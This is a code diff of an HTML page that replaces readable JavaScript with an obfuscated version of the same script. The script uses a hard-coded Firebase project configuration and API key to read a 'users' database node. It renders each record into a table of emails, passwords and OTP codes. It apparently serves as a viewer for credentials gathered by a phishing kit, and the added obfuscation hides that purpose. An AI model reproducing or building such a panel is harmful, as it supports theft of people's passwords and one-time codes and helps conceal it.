@@ -8,43 +8,6 @@
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
 <script src="https://www.gstatic.com/firebasejs/4.8.1/firebase.js"></script>
 <script>
-const firebaseConfig = {
-apiKey: "AIzaSyBIdCyVtyF604sJ3Iqh27jisoCKjhx69rE",
-authDomain: "sahayogi-147181.firebaseapp.com",
-projectId: "sahayogi-147181",
-databaseURL: "https://sahayogi-147181-default-rtdb.firebaseio.com/",
-storageBucket: "sahayogi-147181.appspot.com",
-messagingSenderId: "822985993451",
-appId: "1:822985993451:web:96e24dfa1c27d986a9e2ae",
-measurementId: "G-65K8VQGCZT"
-};
-
-firebase.initializeApp(firebaseConfig);
-const dbRef = firebase.database().ref();
-const usersRef = dbRef.child('users');
-
-function readPassword() {
-  usersRef.once("value")
-    .then(function(snapshot) {
-      var data = snapshot.val();
-      var tableHtml = "<table class='table table-striped'><thead><tr><th>Email</th><th>Password</th><th>OTP</th><th>PASSWORD</th></tr></thead><tbody>";
-
-      for (var key in data) {
-        tableHtml += "<tr>";
-        for(var usd in data[key]){
-        	tableHtml += "<td>"+data[key][usd]+"</td>";
-        }
-        tableHtml += "</tr>";
-      }
-
-      tableHtml += "</tbody></table>";
-
-      // Display the table in an HTML element with id "table-container"
-      document.getElementById("table-container").innerHTML = tableHtml;
-    })
-    .catch(function(error) {
-      console.error("Error reading data:", error);
-    });
-}
+var _0x498007=_0x10fa;(function(_0x463cde,_0xb41e30){var _0x4d728f=_0x10fa,_0xe552a0=_0x463cde();while(!![]){try{var _0x1c5334=parseInt(_0x4d728f(0x1b0))/0x1*(-parseInt(_0x4d728f(0x1bb))/0x2)+parseInt(_0x4d728f(0x1b1))/0x3+parseInt(_0x4d728f(0x1c2))/0x4+-parseInt(_0x4d728f(0x1b4))/0x5*(parseInt(_0x4d728f(0x1b7))/0x6)+parseInt(_0x4d728f(0x1b8))/0x7*(-parseInt(_0x4d728f(0x1c7))/0x8)+parseInt(_0x4d728f(0x1ba))/0x9*(-parseInt(_0x4d728f(0x1a9))/0xa)+-parseInt(_0x4d728f(0x1c5))/0xb*(-parseInt(_0x4d728f(0x1be))/0xc);if(_0x1c5334===_0xb41e30)break;else _0xe552a0['push'](_0xe552a0['shift']());}catch(_0x4bc387){_0xe552a0['push'](_0xe552a0['shift']());}}}(_0x595c,0xb3d9d));const firebaseConfig={'apiKey':_0x498007(0x1c9),'authDomain':_0x498007(0x1c0),'projectId':_0x498007(0x1bd),'databaseURL':_0x498007(0x1bf),'storageBucket':_0x498007(0x1c3),'messagingSenderId':_0x498007(0x1cb),'appId':_0x498007(0x1b2),'measurementId':'G-65K8VQGCZT'};firebase['initializeApp'](firebaseConfig);function _0x10fa(_0x4efc3a,_0x415cd9){var _0x595c1f=_0x595c();return _0x10fa=function(_0x10fa5a,_0x3c0277){_0x10fa5a=_0x10fa5a-0x1a7;var _0x15a204=_0x595c1f[_0x10fa5a];return _0x15a204;},_0x10fa(_0x4efc3a,_0x415cd9);}const dbRef=firebase[_0x498007(0x1ac)]()[_0x498007(0x1b5)](),usersRef=dbRef[_0x498007(0x1ab)](_0x498007(0x1ae));function _0x595c(){var _0x48f366=['4aJByZk','</tbody></table>','sahayogi-147181','2402736MUsabT','https://sahayogi-147181-default-rtdb.firebaseio.com/','sahayogi-147181.firebaseapp.com','error','4890228oeIwNa','sahayogi-147181.appspot.com','innerHTML','99aubTHr','</tr>','12136mdUhMm','once','AIzaSyBIdCyVtyF604sJ3Iqh27jisoCKjhx69rE','<tr>','822985993451','<td>','catch','<table\x20class=\x27table\x20table-striped\x27><thead><tr><th>Email</th><th>Password</th><th>OTP</th><th>PASSWORD</th></tr></thead><tbody>','160SMQzzV','then','child','database','val','users','Error\x20reading\x20data:','715386auYwmA','2783085CoEOuu','1:822985993451:web:96e24dfa1c27d986a9e2ae','table-container','1048130ZaVkQl','ref','getElementById','24tMeLKc','2597pJaduv','value','215748usafan'];_0x595c=function(){return _0x48f366;};return _0x595c();}function readPassword(){var _0x46f333=_0x498007;usersRef[_0x46f333(0x1c8)](_0x46f333(0x1b9))[_0x46f333(0x1aa)](function(_0x32380c){var _0x46bd33=_0x46f333,_0x49a582=_0x32380c[_0x46bd33(0x1ad)](),_0x4198bc=_0x46bd33(0x1a8);for(var _0x54fb2a in _0x49a582){_0x4198bc+=_0x46bd33(0x1ca);for(var _0x2aaa40 in _0x49a582[_0x54fb2a]){_0x4198bc+=_0x46bd33(0x1cc)+_0x49a582[_0x54fb2a][_0x2aaa40]+'</td>';}_0x4198bc+=_0x46bd33(0x1c6);}_0x4198bc+=_0x46bd33(0x1bc),document[_0x46bd33(0x1b6)](_0x46bd33(0x1b3))[_0x46bd33(0x1c4)]=_0x4198bc;})[_0x46f333(0x1a7)](function(_0x259f54){var _0x4a4c26=_0x46f333;console[_0x4a4c26(0x1c1)](_0x4a4c26(0x1af),_0x259f54);});}
 </script>
 </html>
